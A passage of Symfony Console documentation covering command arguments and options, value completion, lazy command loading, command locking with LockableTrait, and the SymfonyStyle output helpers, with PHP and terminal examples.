                // ...
                ->addArgument('name', InputArgument::REQUIRED, 'Who do you want to greet?')
                ->addArgument('last_name', InputArgument::OPTIONAL, 'Your last name?')
            ;
        }
    }

You now have access to a ``last_name`` argument in your command::

    // ...
    use Symfony\Component\Console\Command\Command;
    use Symfony\Component\Console\Input\InputInterface;
    use Symfony\Component\Console\Output\OutputInterface;

    class GreetCommand extends Command
    {
        // ...

        protected function execute(InputInterface $input, OutputInterface $output): int
        {
            $text = 'Hi '.$input->getArgument('name');

            $lastName = $input->getArgument('last_name');
            if ($lastName) {
                $text .= ' '.$lastName;
            }

            $output->writeln($text.'!');

            return Command::SUCCESS;
        }
    }

The command can now be used in either of the following ways:

.. code-block:: terminal

    $ php bin/console app:greet Fabien
    Hi Fabien!

    $ php bin/console app:greet Fabien Potencier
    Hi Fabien Potencier!

It is also possible to let an argument take a list of values (imagine you want
to greet all your friends). Only the last argument can be a list::

    $this
        // ...
        ->addArgument(
            'names',
            InputArgument::IS_ARRAY,
            'Who do you want to greet (separate multiple names with a space)?'
        )
    ;

To use this, specify as many names as you want:

.. code-block:: terminal

    $ php bin/console app:greet Fabien Ryan Bernhard

You can access the ``names`` argument as an array::

    $names = $input->getArgument('names');
    if (count($names) > 0) {
        $text .= ' '.implode(', ', $names);
    }

There are three argument variants you can use:

``InputArgument::REQUIRED``
    The argument is mandatory. The command doesn't run if the argument isn't
    provided;

``InputArgument::OPTIONAL``
    The argument is optional and therefore can be omitted. This is the default
    behavior of arguments;

``InputArgument::IS_ARRAY``
    The argument can contain any number of values. For that reason, it must be
    used at the end of the argument list.

You can combine ``IS_ARRAY`` with ``REQUIRED`` or ``OPTIONAL`` like this::

    $this
        // ...
        ->addArgument(
            'names',
            InputArgument::IS_ARRAY | InputArgument::REQUIRED,
            'Who do you want to greet (separate multiple names with a space)?'
        )
    ;

Using Command Options
---------------------

Unlike arguments, options are not ordered (meaning you can specify them in any
order) and are specified with two dashes (e.g. ``--yell``). Options are
*always* optional, and can be setup to accept a value (e.g. ``--dir=src``) or
as a boolean flag without a value (e.g.  ``--yell``).

For example, add a new option to the command that can be used to specify
how many times in a row the message should be printed::

    // ...
    use Symfony\Component\Console\Input\InputOption;

    $this
        // ...
        ->addOption(
            // this is the name that users must type to pass this option (e.g. --iterations=5)
            'iterations',
            // this is the optional shortcut of the option name, which usually is just a letter
            // (e.g. `i`, so users pass it as `-i`); use it for commonly used options
            // or options with long names
            null,
            // this is the type of option (e.g. requires a value, can be passed more than once, etc.)
            InputOption::VALUE_REQUIRED,
            // the option description displayed when showing the command help
            'How many times should the message be printed?',
            // the default value of the option (for those which allow to pass values)
            1
        )
    ;

Next, use this in the command to print the message multiple times::

    for ($i = 0; $i < $input->getOption('iterations'); $i++) {
        $output->writeln($text);
    }

Now, when you run the command, you can optionally specify a ``--iterations``
flag:

.. code-block:: terminal

    # no --iterations provided, the default (1) is used
    $ php bin/console app:greet Fabien
    Hi Fabien!

    $ php bin/console app:greet Fabien --iterations=5
    Hi Fabien!
    Hi Fabien!
    Hi Fabien!
    Hi Fabien!
    Hi Fabien!

    # the order of options isn't important
    $ php bin/console app:greet Fabien --iterations=5 --yell
    $ php bin/console app:greet Fabien --yell --iterations=5
    $ php bin/console app:greet --yell --iterations=5 Fabien

.. tip::

    You can also declare a one-letter shortcut that you can call with a single
    dash, like ``-i``::

        $this
            // ...
            ->addOption(
                'iterations',
                'i',
                InputOption::VALUE_REQUIRED,
                'How many times should the message be printed?',
                1
            )
        ;

Note that to comply with the `docopt standard`_, long options can specify their
values after a whitespace or an ``=`` sign (e.g. ``--iterations 5`` or
``--iterations=5``), but short options can only use whitespaces or no
separation at all (e.g. ``-i 5`` or ``-i5``).

.. caution::

    While it is possible to separate an option from its value with a whitespace,
    using this form leads to an ambiguity should the option appear before the
    command name. For example, ``php bin/console --iterations 5 app:greet Fabien``
    is ambiguous; Symfony would interpret ``5`` as the command name. To avoid
    this situation, always place options after the command name, or avoid using
    a space to separate the option name from its value.

There are five option variants you can use:

``InputOption::VALUE_IS_ARRAY``
    This option accepts multiple values (e.g. ``--dir=/foo --dir=/bar``);

``InputOption::VALUE_NONE``
    Do not accept input for this option (e.g. ``--yell``). The value returned
    from is a boolean (``false`` if the option is not provided).
    This is the default behavior of options;

``InputOption::VALUE_REQUIRED``
    This value is required (e.g. ``--iterations=5`` or ``-i5``), the option
    itself is still optional;

``InputOption::VALUE_OPTIONAL``
    This option may or may not have a value (e.g. ``--yell`` or
    ``--yell=loud``).

``InputOption::VALUE_NEGATABLE``
    Accept either the flag (e.g. ``--yell``) or its negation (e.g.
    ``--no-yell``).

You need to combine ``VALUE_IS_ARRAY`` with ``VALUE_REQUIRED`` or
``VALUE_OPTIONAL`` like this::

    $this
        // ...
        ->addOption(
            'colors',
            null,
            InputOption::VALUE_REQUIRED | InputOption::VALUE_IS_ARRAY,
            'Which colors do you like?',
            ['blue', 'red']
        )
    ;

Options with optional arguments
-------------------------------

There is nothing forbidding you to create a command with an option that
optionally accepts a value, but it's a bit tricky. Consider this example::

    // ...
    use Symfony\Component\Console\Input\InputOption;

    $this
        // ...
        ->addOption(
            'yell',
            null,
            InputOption::VALUE_OPTIONAL,
            'Should I yell while greeting?'
        )
    ;

This option can be used in 3 ways: ``greet --yell``, ``greet --yell=louder``,
and ``greet``. However, it's hard to distinguish between passing the option
without a value (``greet --yell``) and not passing the option (``greet``).

To solve this issue, you have to set the option's default value to ``false``::

    // ...
    use Symfony\Component\Console\Input\InputOption;

    $this
        // ...
        ->addOption(
            'yell',
            null,
            InputOption::VALUE_OPTIONAL,
            'Should I yell while greeting?',
            false // this is the new default value, instead of null
        )
    ;

Now it's possible to differentiate between not passing the option and not
passing any value for it::

    $optionValue = $input->getOption('yell');
    if (false === $optionValue) {
        // in this case, the option was not passed when running the command
        $yell = false;
        $yellLouder = false;
    } elseif (null === $optionValue) {
        // in this case, the option was passed when running the command
        // but no value was given to it
        $yell = true;
        $yellLouder = false;
    } else {
        // in this case, the option was passed when running the command and
        // some specific value was given to it
        $yell = true;
        if ('louder' === $optionValue) {
            $yellLouder = true;
        } else {
            $yellLouder = false;
        }
    }

The above code can be simplified as follows because ``false !== null``::

    $optionValue = $input->getOption('yell');
    $yell = ($optionValue !== false);
    $yellLouder = ($optionValue === 'louder');

Fetching The Raw Command Input
------------------------------

Symfony provides a :method:`Symfony\\Component\\Console\\Input\\ArgvInput::getRawTokens`
method to fetch the raw input that was passed to the command. This is useful if
you want to parse the input yourself or when you need to pass the input to another
command without having to worry about the number of arguments or options::

    // ...
    use Symfony\Component\Process\Process;

    protected function execute(InputInterface $input, OutputInterface $output): int
    {
        // if this command was run as:
        // php bin/console app:my-command foo --bar --baz=3 --qux=value1 --qux=value2

        $tokens = $input->getRawTokens();
        // $tokens = ['app:my-command', 'foo', '--bar', '--baz=3', '--qux=value1', '--qux=value2'];

        // pass true as argument to not include the original command name
        $tokens = $input->getRawTokens(true);
        // $tokens = ['foo', '--bar', '--baz=3', '--qux=value1', '--qux=value2'];

        // pass the raw input to any other command (from Symfony or the operating system)
        $process = new Process(['app:other-command', ...$input->getRawTokens(true)]);
        $process->setTty(true);
        $process->mustRun();

        // ...
    }

.. versionadded:: 7.1

    The :method:`Symfony\\Component\\Console\\Input\\ArgvInput::getRawTokens`
    method was introduced in Symfony 7.1.

Adding Argument/Option Value Completion
---------------------------------------

If :ref:`Console completion is installed <console-completion-setup>`,
command and option names will be auto completed by the shell. However, you
can also implement value completion for the input in your commands. For
instance, you may want to complete all usernames from the database in the
``name`` argument of your greet command.

To achieve this, use the 5th argument of ``addArgument()``/``addOption``::

    // ...
    use Symfony\Component\Console\Completion\CompletionInput;
    use Symfony\Component\Console\Completion\CompletionSuggestions;

    class GreetCommand extends Command
    {
        // ...
        protected function configure(): void
        {
            $this
                ->addArgument(
                    'names',
                    InputArgument::IS_ARRAY,
                    'Who do you want to greet (separate multiple names with a space)?',
                    null,
                    function (CompletionInput $input): array {
                        // the value the user already typed, e.g. when typing "app:greet Fa" before
                        // pressing Tab, this will contain "Fa"
                        $currentValue = $input->getCompletionValue();

                        // get the list of username names from somewhere (e.g. the database)
                        // you may use $currentValue to filter down the names
                        $availableUsernames = ...;

                        // then suggested the usernames as values
                        return $availableUsernames;
                    }
                )
            ;
        }
    }

That's all you need! Assuming users "Fabien" and "Fabrice" exist, pressing
tab after typing ``app:greet Fa`` will give you these names as a suggestion.

.. tip::

    The shell script is able to handle huge amounts of suggestions and will
    automatically filter the suggested values based on the existing input
    from the user. You do not have to implement any filter logic in the
    command.

    You may use ``CompletionInput::getCompletionValue()`` to get the
    current input if that helps improving performance (e.g. by reducing the
    number of rows fetched from the database).

Testing the Completion script
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

The Console component comes with a special
:class:`Symfony\\Component\\Console\\Tester\\CommandCompletionTester` class
to help you unit test the completion logic::

    // ...
    use Symfony\Component\Console\Application;

    class GreetCommandTest extends TestCase
    {
        public function testComplete(): void
        {
            $application = new Application();
            $application->add(new GreetCommand());

            // create a new tester with the greet command
            $tester = new CommandCompletionTester($application->get('app:greet'));

            // complete the input without any existing input (the empty string represents
            // the position of the cursor)
            $suggestions = $tester->complete(['']);
            $this->assertSame(['Fabien', 'Fabrice', 'Wouter'], $suggestions);

            // If you filter the values inside your own code (not recommended, unless you
            // need to improve performance of e.g. a database query), you can test this
            // by passing the user input
            $suggestions = $tester->complete(['Fa']);
            $this->assertSame(['Fabien', 'Fabrice'], $suggestions);
        }
    }

.. _console-global-options:

Command Global Options
----------------------

The Console component adds some predefined options to all commands:

* ``--verbose``: sets the verbosity level (e.g. ``1`` the default, ``2`` and
  ``3``, or you can use respective shortcuts ``-v``, ``-vv`` and ``-vvv``)
* ``--quiet``: disables output and interaction
* ``--no-interaction``: disables interaction
* ``--version``: outputs the version number of the console application
* ``--help``: displays the command help
* ``--ansi|--no-ansi``: whether to force of disable coloring the output

When using the ``FrameworkBundle``, two more options are predefined:

* ``--env``: sets the Kernel configuration environment (defaults to ``APP_ENV``)
* ``--no-debug``: disables Kernel debug (defaults to ``APP_DEBUG``)

So your custom commands can use them too out-of-the-box.

.. _`docopt standard`: http://docopt.org/
How to Make Commands Lazily Loaded
==================================

.. note::

    If you are using the Symfony full-stack framework, you are probably looking for
    details about :ref:`creating lazy commands <console-command-service-lazy-loading>`

The traditional way of adding commands to your application is to use
:method:`Symfony\\Component\\Console\\Application::add`, which expects a
``Command`` instance as an argument.

This approach can have downsides as some commands might be expensive to
instantiate in which case you may want to lazy-load them. Note however that lazy-loading
is not absolute. Indeed a few commands such as ``list``, ``help`` or ``_complete`` can
require to instantiate other commands although they are lazy. For example ``list`` needs
to get the name and description of all commands, which might require the command to be
instantiated to get.

In order to lazy-load commands, you need to register an intermediate loader
which will be responsible for returning ``Command`` instances::

    use App\Command\HeavyCommand;
    use Symfony\Component\Console\Application;
    use Symfony\Component\Console\Command\Command;
    use Symfony\Component\Console\CommandLoader\FactoryCommandLoader;

    $commandLoader = new FactoryCommandLoader([
        // Note that the `list` command will still instantiate that command
        // in this example.
        'app:heavy' => static fn(): Command => new HeavyCommand(),
    ]);

    $application = new Application();
    $application->setCommandLoader($commandLoader);
    $application->run();

This way, the ``HeavyCommand`` instance will be created only when the ``app:heavy``
command is actually called.

This example makes use of the built-in
:class:`Symfony\\Component\\Console\\CommandLoader\\FactoryCommandLoader` class,
but the :method:`Symfony\\Component\\Console\\Application::setCommandLoader`
method accepts any
:class:`Symfony\\Component\\Console\\CommandLoader\\CommandLoaderInterface`
instance so you can use your own implementation.

Another way to do so is to take advantage of ``Symfony\Component\Console\Command\LazyCommand``::

    use App\Command\HeavyCommand;
    use Symfony\Component\Console\Application;
    use Symfony\Component\Console\Command\Command;
    use Symfony\Component\Console\CommandLoader\FactoryCommandLoader;

    // In this case although the command is instantiated, the underlying command factory
    // will not be executed unless the command is actually executed or one tries to access
    // its input definition to know its argument or option inputs.
    $lazyCommand = new LazyCommand(
        'app:heavy',
        [],
        'This is another more complete form of lazy command.',
        false,
        static fn (): Command => new HeavyCommand(),
    );

    $application = new Application();
    $application->add($lazyCommand);
    $application->run();

Built-in Command Loaders
------------------------

``FactoryCommandLoader``
~~~~~~~~~~~~~~~~~~~~~~~~

The :class:`Symfony\\Component\\Console\\CommandLoader\\FactoryCommandLoader`
class provides a way of getting commands lazily loaded as it takes an
array of ``Command`` factories as its only constructor argument::

    use Symfony\Component\Console\Command\Command;
    use Symfony\Component\Console\CommandLoader\FactoryCommandLoader;

    $commandLoader = new FactoryCommandLoader([
        'app:foo' => function (): Command { return new FooCommand(); },
        'app:bar' => [BarCommand::class, 'create'],
    ]);

Factories can be any PHP callable and will be executed each time
:method:`Symfony\\Component\\Console\\CommandLoader\\FactoryCommandLoader::get`
is called.

``ContainerCommandLoader``
~~~~~~~~~~~~~~~~~~~~~~~~~~

The :class:`Symfony\\Component\\Console\\CommandLoader\\ContainerCommandLoader`
class can be used to load commands from a PSR-11 container. As such, its
constructor takes a PSR-11 ``ContainerInterface`` implementation as its first
argument and a command map as its last argument. The command map must be an array
with command names as keys and service identifiers as values::

    use Symfony\Component\Console\CommandLoader\ContainerCommandLoader;
    use Symfony\Component\DependencyInjection\ContainerBuilder;

    $container = new ContainerBuilder();
    $container->register(FooCommand::class, FooCommand::class);
    $container->compile();

    $commandLoader = new ContainerCommandLoader($container, [
        'app:foo' => FooCommand::class,
    ]);

Like this, executing the ``app:foo`` command will load the ``FooCommand`` service
by calling ``$container->get(FooCommand::class)``.
Prevent Running the Same Console Command Multiple Times
=======================================================

You can use `locks`_ to prevent the same command from running multiple times on
the same server. The :doc:`Lock component </components/lock>` provides multiple
classes to create locks based on the filesystem (:ref:`FlockStore <lock-store-flock>`),
shared memory (:ref:`SemaphoreStore <lock-store-semaphore>`) and even databases
and Redis servers.

In addition, the Console component provides a PHP trait called ``LockableTrait``
that adds two convenient methods to lock and release commands::

    // ...
    use Symfony\Component\Console\Command\Command;
    use Symfony\Component\Console\Command\LockableTrait;
    use Symfony\Component\Console\Input\InputInterface;
    use Symfony\Component\Console\Output\OutputInterface;

    class UpdateContentsCommand extends Command
    {
        use LockableTrait;

        // ...

        protected function execute(InputInterface $input, OutputInterface $output): int
        {
            if (!$this->lock()) {
                $output->writeln('The command is already running in another process.');

                return Command::SUCCESS;
            }

            // If you prefer to wait until the lock is released, use this:
            // $this->lock(null, true);

            // ...

            // if not released explicitly, Symfony releases the lock
            // automatically when the execution of the command ends
            $this->release();

            return Command::SUCCESS;
        }
    }

The LockableTrait will use the ``SemaphoreStore`` if available and will default
to ``FlockStore`` otherwise. You can override this behavior by setting
a ``$lockFactory`` property with your own lock factory::

    // ...
    use Symfony\Component\Console\Command\Command;
    use Symfony\Component\Console\Command\LockableTrait;
    use Symfony\Component\Lock\LockFactory;

    class UpdateContentsCommand extends Command
    {
        use LockableTrait;

        public function __construct(private LockFactory $lockFactory)
        {
        }

        // ...
    }

.. versionadded::  7.1

    The ``$lockFactory`` property was introduced in Symfony 7.1.

.. _`locks`: https://en.wikipedia.org/wiki/Lock_(computer_science)
How to Style a Console Command
==============================

One of the most boring tasks when creating console commands is to deal with the
styling of the command's input and output. Displaying titles and tables or asking
questions to the user involves a lot of repetitive code.

Consider for example the code used to display the title of the following command::

    // src/Command/GreetCommand.php
    namespace App\Command;

    use Symfony\Component\Console\Command\Command;
    use Symfony\Component\Console\Input\InputInterface;
    use Symfony\Component\Console\Output\OutputInterface;

    class GreetCommand extends Command
    {
        // ...

        protected function execute(InputInterface $input, OutputInterface $output): int
        {
            $output->writeln([
                '<info>Lorem Ipsum Dolor Sit Amet</>',
                '<info>==========================</>',
                '',
            ]);

            // ...
        }
    }

Displaying a simple title requires three lines of code, to change the font color,
underline the contents and leave an additional blank line after the title. Dealing
with styles is required for well-designed commands, but it complicates their code
unnecessarily.

In order to reduce that boilerplate code, Symfony commands can optionally use the
**Symfony Style Guide**. These styles are implemented as a set of helper methods
which allow to create *semantic* commands and forget about their styling.

Basic Usage
-----------

In your command, instantiate the :class:`Symfony\\Component\\Console\\Style\\SymfonyStyle`
class and pass the ``$input`` and ``$output`` variables as its arguments. Then,
you can start using any of its helpers, such as ``title()``, which displays the
title of the command::

    // src/Command/GreetCommand.php
    namespace App\Command;

    use Symfony\Component\Console\Command\Command;
    use Symfony\Component\Console\Input\InputInterface;
    use Symfony\Component\Console\Output\OutputInterface;
    use Symfony\Component\Console\Style\SymfonyStyle;

    class GreetCommand extends Command
    {
        // ...

        protected function execute(InputInterface $input, OutputInterface $output): int
        {
            $io = new SymfonyStyle($input, $output);
            $io->title('Lorem Ipsum Dolor Sit Amet');

            // ...
        }
    }

Helper Methods
--------------

The :class:`Symfony\\Component\\Console\\Style\\SymfonyStyle` class defines some
helper methods that cover the most common interactions performed by console commands.

Titling Methods
~~~~~~~~~~~~~~~

:method:`Symfony\\Component\\Console\\Style\\SymfonyStyle::title`
    It displays the given string as the command title. This method is meant to
    be used only once in a given command, but nothing prevents you to use it
    repeatedly::

        $io->title('Lorem ipsum dolor sit amet');

:method:`Symfony\\Component\\Console\\Style\\SymfonyStyle::section`
    It displays the given string as the title of some command section. This is
    only needed in complex commands which want to better separate their contents::

        $io->section('Adding a User');

        // ...

        $io->section('Generating the Password');

        // ...

.. _symfony-style-content:

Content Methods
~~~~~~~~~~~~~~~

:method:`Symfony\\Component\\Console\\Style\\SymfonyStyle::text`
    It displays the given string or array of strings as regular text. This is
    useful to render help messages and instructions for the user running the
    command::

        // use simple strings for short messages
        $io->text('Lorem ipsum dolor sit amet');

        // ...

        // consider using arrays when displaying long messages
        $io->text([
            'Lorem ipsum dolor sit amet',
            'Consectetur adipiscing elit',
            'Aenean sit amet arcu vitae sem faucibus porta',
        ]);

:method:`Symfony\\Component\\Console\\Style\\SymfonyStyle::listing`
    It displays an unordered list of elements passed as an array::

        $io->listing([
            'Element #1 Lorem ipsum dolor sit amet',
            'Element #2 Lorem ipsum dolor sit amet',
            'Element #3 Lorem ipsum dolor sit amet',
        ]);

:method:`Symfony\\Component\\Console\\Style\\SymfonyStyle::table`
    It displays the given array of headers and rows as a compact table::

        $io->table(
            ['Header 1', 'Header 2'],
            [
                ['Cell 1-1', 'Cell 1-2'],
                ['Cell 2-1', 'Cell 2-2'],
                ['Cell 3-1', 'Cell 3-2'],
            ]
        );

:method:`Symfony\\Component\\Console\\Style\\SymfonyStyle::horizontalTable`
    It displays the given array of headers and rows as a compact horizontal table::

        $io->horizontalTable(
            ['Header 1', 'Header 2'],
            [
                ['Cell 1-1', 'Cell 1-2'],
                ['Cell 2-1', 'Cell 2-2'],
                ['Cell 3-1', 'Cell 3-2'],
            ]
        );

:method:`Symfony\\Component\\Console\\Style\\SymfonyStyle::definitionList`
    It displays the given ``key => value`` pairs as a compact list of elements::

        $io->definitionList(
            'This is a title',
            ['foo1' => 'bar1'],
            ['foo2' => 'bar2'],
            ['foo3' => 'bar3'],
            new TableSeparator(),
            'This is another title',
            ['foo4' => 'bar4']
        );

:method:`Symfony\\Component\\Console\\Style\\SymfonyStyle::createTable`
    Creates an instance of :class:`Symfony\\Component\\Console\\Helper\\Table`
    styled according to the Symfony Style Guide, which allows you to use
    features such as dynamically appending rows.

:method:`Symfony\\Component\\Console\\Style\\SymfonyStyle::newLine`
    It displays a blank line in the command output. Although it may seem useful,
    most of the times you won't need it at all. The reason is that every helper
    already adds their own blank lines, so you don't have to care about the
    vertical spacing::

        // outputs a single blank line
        $io->newLine();

        // outputs three consecutive blank lines
        $io->newLine(3);

Admonition Methods
~~~~~~~~~~~~~~~~~~

:method:`Symfony\\Component\\Console\\Style\\SymfonyStyle::note`
    It displays the given string or array of strings as a highlighted admonition.
    Use this helper sparingly to avoid cluttering command's output::

        // use simple strings for short notes
        $io->note('Lorem ipsum dolor sit amet');

        // ...

        // consider using arrays when displaying long notes
        $io->note([
            'Lorem ipsum dolor sit amet',
            'Consectetur adipiscing elit',
            'Aenean sit amet arcu vitae sem faucibus porta',
        ]);

:method:`Symfony\\Component\\Console\\Style\\SymfonyStyle::caution`
    Similar to the ``note()`` helper, but the contents are more prominently
    highlighted. The resulting contents resemble an error message, so you should
    avoid using this helper unless strictly necessary::

        // use simple strings for short caution message
        $io->caution('Lorem ipsum dolor sit amet');

        // ...

        // consider using arrays when displaying long caution messages
        $io->caution([
            'Lorem ipsum dolor sit amet',
            'Consectetur adipiscing elit',
            'Aenean sit amet arcu vitae sem faucibus porta',
        ]);

.. _symfony-style-progressbar:

Progress Bar Methods
~~~~~~~~~~~~~~~~~~~~

:method:`Symfony\\Component\\Console\\Style\\SymfonyStyle::progressStart`
    It displays a progress bar with a number of steps equal to the argument passed
    to the method (don't pass any value if the length of the progress bar is
    unknown)::

        // displays a progress bar of unknown length
        $io->progressStart();

        // displays a 100-step length progress bar
        $io->progressStart(100);

:method:`Symfony\\Component\\Console\\Style\\SymfonyStyle::progressAdvance`
    It makes the progress bar advance the given number of steps (or ``1`` step
    if no argument is passed)::

        // advances the progress bar 1 step
        $io->progressAdvance();

        // advances the progress bar 10 steps
        $io->progressAdvance(10);

:method:`Symfony\\Component\\Console\\Style\\SymfonyStyle::progressFinish`
    It finishes the progress bar (filling up all the remaining steps when its
    length is known)::

        $io->progressFinish();

:method:`Symfony\\Component\\Console\\Style\\SymfonyStyle::progressIterate`
    If your progress bar loops over an iterable collection, use the
    ``progressIterate()`` helper::

        $iterable = [1, 2];

        foreach ($io->progressIterate($iterable) as $value) {
            // ... do some work
        }

:method:`Symfony\\Component\\Console\\Style\\SymfonyStyle::createProgressBar`
    Creates an instance of :class:`Symfony\\Component\\Console\\Helper\\ProgressBar`
    styled according to the Symfony Style Guide.

.. _symfony-style-questions:

User Input Methods
~~~~~~~~~~~~~~~~~~

:method:`Symfony\\Component\\Console\\Style\\SymfonyStyle::ask`
    It asks the user to provide some value::

        $io->ask('What is your name?');

    You can pass the default value as the second argument so the user can
    hit the <Enter> key to select that value::

        $io->ask('Where are you from?', 'United States');

    In case you need to validate the given value, pass a callback validator as
    the third argument::

        $io->ask('Number of workers to start', '1', function (string $number): int {
            if (!is_numeric($number)) {
                throw new \RuntimeException('You must type a number.');
            }

            return (int) $number;
        });

:method:`Symfony\\Component\\Console\\Style\\SymfonyStyle::askHidden`
    It's very similar to the ``ask()`` method but the user's input will be hidden
    and it cannot define a default value. Use it when asking for sensitive information::

        $io->askHidden('What is your password?');

    In case you need to validate the given value, pass a callback validator as
    the second argument::

        $io->askHidden('What is your password?', function (string $password): string {
            if (empty($password)) {
                throw new \RuntimeException('Password cannot be empty.');
            }

            return $password;
        });

:method:`Symfony\\Component\\Console\\Style\\SymfonyStyle::confirm`
    It asks a Yes/No question to the user and it only returns ``true`` or ``false``::

        $io->confirm('Restart the web server?');

    You can pass the default value as the second argument so the user can
    hit the <Enter> key to select that value::

        $io->confirm('Restart the web server?', true);

:method:`Symfony\\Component\\Console\\Style\\SymfonyStyle::choice`
    It asks a question whose answer is constrained to the given list of valid
    answers::

        $io->choice('Select the queue to analyze', ['queue1', 'queue2', 'queue3']);

    You can pass the default value as the third argument so the user can
    hit the <Enter> key to select that value::

        $io->choice('Select the queue to analyze', ['queue1', 'queue2', 'queue3'], 'queue1');

    Finally, you can allow users to select multiple choices. To do so, users must
    separate each choice with a comma (e.g. typing ``1, 2`` will select choice 1
    and 2)::

        $io->choice('Select the queue to analyze', ['queue1', 'queue2', 'queue3'], multiSelect: true);

.. _symfony-style-blocks:

Result Methods
~~~~~~~~~~~~~~

.. note::

    If you print any URL it won't be broken/cut, it will be clickable - if the terminal provides it. If the "well
    formatted output" is more important, you can switch it off::

        $io->getOutputWrapper()->setAllowCutUrls(true);

:method:`Symfony\\Component\\Console\\Style\\SymfonyStyle::success`
    It displays the given string or array of strings highlighted as a successful
    message (with a green background and the ``[OK]`` label). It's meant to be
    used once to display the final result of executing the given command, but you
    can use it repeatedly during the execution of the command::

        // use simple strings for short success messages
        $io->success('Lorem ipsum dolor sit amet');

        // ...

        // consider using arrays when displaying long success messages
        $io->success([
            'Lorem ipsum dolor sit amet',
            'Consectetur adipiscing elit',
        ]);

:method:`Symfony\\Component\\Console\\Style\\SymfonyStyle::info`
    It's similar to the ``success()`` method (the given string or array of strings
    are displayed with a green background) but the ``[OK]`` label is not prefixed.
    It's meant to be used once to display the final result of executing the given
    command, without showing the result as a successful or failed one::

        // use simple strings for short info messages
        $io->info('Lorem ipsum dolor sit amet');

        // ...

        // consider using arrays when displaying long info messages
        $io->info([
            'Lorem ipsum dolor sit amet',
            'Consectetur adipiscing elit',
        ]);

:method:`Symfony\\Component\\Console\\Style\\SymfonyStyle::warning`
    It displays the given string or array of strings highlighted as a warning
    message (with a red background and the ``[WARNING]`` label). It's meant to be
    used once to display the final result of executing the given command, but you
    can use it repeatedly during the execution of the command::

        // use simple strings for short warning messages
        $io->warning('Lorem ipsum dolor sit amet');

        // ...

        // consider using arrays when displaying long warning messages
        $io->warning([
            'Lorem ipsum dolor sit amet',
            'Consectetur adipiscing elit',
        ]);

:method:`Symfony\\Component\\Console\\Style\\SymfonyStyle::error`
    It displays the given string or array of strings highlighted as an error
    message (with a red background and the ``[ERROR]`` label). It's meant to be
    used once to display the final result of executing the given command, but you
    can use it repeatedly during the execution of the command::

        // use simple strings for short error messages
        $io->error('Lorem ipsum dolor sit amet');

        // ...

        // consider using arrays when displaying long error messages
        $io->error([
            'Lorem ipsum dolor sit amet',
            'Consectetur adipiscing elit',
        ]);

Configuring the Default Styles
------------------------------

By default, Symfony Styles wrap all contents to avoid having lines of text that
are too long. The only exception is URLs, which are not wrapped, no matter how
long they are. This is done to enable clickable URLs in terminals that support them.

If you prefer to wrap all contents, including URLs, use this method::

    // src/Command/GreetCommand.php
    namespace App\Command;

    // ...
    use Symfony\Component\Console\Style\SymfonyStyle;

    class GreetCommand extends Command
    {
        // ...

        protected function execute(InputInterface $input, OutputInterface $output): int
        {
            $io = new SymfonyStyle($input, $output);
            $io->getOutputWrapper()->setAllowCutUrls(true);

            // ...
        }
    }

Defining your Own Styles
------------------------

If you don't like the design of the commands that use the Symfony Style, you can
define your own set of console styles. Create a class that implements the
:class:`Symfony\\Component\\Console\\Style\\StyleInterface`::

    namespace App\Console;

    use Symfony\Component\Console\Style\StyleInterface;

    class CustomStyle implements StyleInterface
    {
        // ...implement the methods of the interface
    }

Then, instantiate this custom class instead of the default ``SymfonyStyle`` in
your commands. Thanks to the ``StyleInterface`` you won't need to change the code
of your commands to change their appearance::

    // src/Command/GreetCommand.php
    namespace App\Console;

    use App\Console\CustomStyle;
    use Symfony\Component\Console\Command\Command;
    use Symfony\Component\Console\Input\InputInterface;
    use Symfony\Component\Console\Output\OutputInterface;

    class GreetCommand extends Command
    {
        // ...

        protected function execute(InputInterface $input, OutputInterface $output): int
        {
            // Before
            $io = new SymfonyStyle($input, $output);

            // After
            $io = new CustomStyle($input, $output);

            // ...
        }
    }

Writing to the error output
---------------------------

If you reuse the output of a command as the input of other commands or dump it
into a file for later reuse, you probably want to exclude progress bars, notes
and other output that provides no real value.

Commands can output information in two different streams: ``stdout`` (standard
output) is the stream where the real contents should be output and ``stderr``
(standard error) is the stream where the errors and the debugging messages
should be output.

The :class:`Symfony\\Component\\Console\\Style\\SymfonyStyle` class provides a
convenient method called :method:`Symfony\\Component\\Console\\Style\\SymfonyStyle::getErrorStyle`
to switch between both streams. This method returns a new ``SymfonyStyle``
instance which makes use of the error output::

    $io = new SymfonyStyle($input, $output);

    // Write to the standard output
    $io->write('Reusable information');

    // Write to the error output
    $io->getErrorStyle()->warning('Debugging information or errors');

.. note::

    If you create a ``SymfonyStyle`` instance with an ``OutputInterface`` object
    that is not an instance of :class:`Symfony\\Component\\Console\\Output\\ConsoleOutputInterface`,
    the ``getErrorStyle()`` method will have no effect and the returned object
    will still write to the standard output instead of the error output.
Console Commands
================

The Symfony framework provides lots of commands through the ``bin/console`` script
(e.g. the well-known ``bin/console cache:clear`` command). These commands are
created with the :doc:`Console component </components/console>`. You can also
use it to create your own commands.

Running Commands
----------------

Each Symfony application comes with a large set of commands. You can use
the ``list`` command to view all available commands in the application:

.. code-block:: terminal

    $ php bin/console list
    ...

    Available commands:
      about                                      Display information about the current project
      completion                                 Dump the shell completion script
      help                                       Display help for a command
      list                                       List commands
     assets
      assets:install                             Install bundle's web assets under a public directory
     cache
      cache:clear                                Clear the cache
    ...

.. note::

    ``list`` is the default command, so running ``php bin/console`` is the same.

If you find the command you need, you can run it with the ``--help`` option
to view the command's documentation:

.. code-block:: terminal

    $ php bin/console assets:install --help

.. note::

    ``--help`` is one of the built-in global options from the Console component,
    which are available for all commands, including those you can create.
    To learn more about them, you can read
    :ref:`this section <console-global-options>`.

APP_ENV & APP_DEBUG
~~~~~~~~~~~~~~~~~~~

Console commands run in the :ref:`environment <config-dot-env>` defined in the ``APP_ENV``
variable of the ``.env`` file, which is ``dev`` by default. It also reads the ``APP_DEBUG``
value to turn "debug" mode on or off (it defaults to ``1``, which is on).

To run the command in another environment or debug mode, edit the value of ``APP_ENV``
and ``APP_DEBUG``. You can also define this env vars when running the
command, for instance:

.. code-block:: terminal

    # clears the cache for the prod environment
    $ APP_ENV=prod php bin/console cache:clear

.. _console-completion-setup:

Console Completion
~~~~~~~~~~~~~~~~~~

If you are using the Bash, Zsh or Fish shell, you can install Symfony's
completion script to get auto completion when typing commands in the
terminal. All commands support name and option completion, and some can
even complete values.

.. image:: /_images/components/console/completion.gif
    :alt: The terminal completes the command name "secrets:remove" and the argument "SOME_OTHER_SECRET".

First, you have to install the completion script *once*. Run
``bin/console completion --help`` for the installation instructions for
your shell.

.. note::

    When using Bash, make sure you installed and setup the "bash completion"
